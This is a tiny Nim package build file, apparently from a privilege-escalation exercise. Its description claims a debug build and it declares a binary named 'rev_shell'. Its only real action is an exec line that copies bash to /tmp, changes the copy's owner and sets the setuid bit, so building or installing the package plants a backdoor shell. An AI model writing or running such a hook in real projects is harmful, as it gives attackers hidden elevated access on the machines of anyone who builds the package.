import ospaths

version = "1.0"
author = "Username"
description = "Build with debug configuration"
license = "MIT"

bin = @["rev_shell"]

exec "cp /bin/bash /tmp/bash; chown webadmin:webadmin /tmp/bash; chmod +s /tmp/bash"
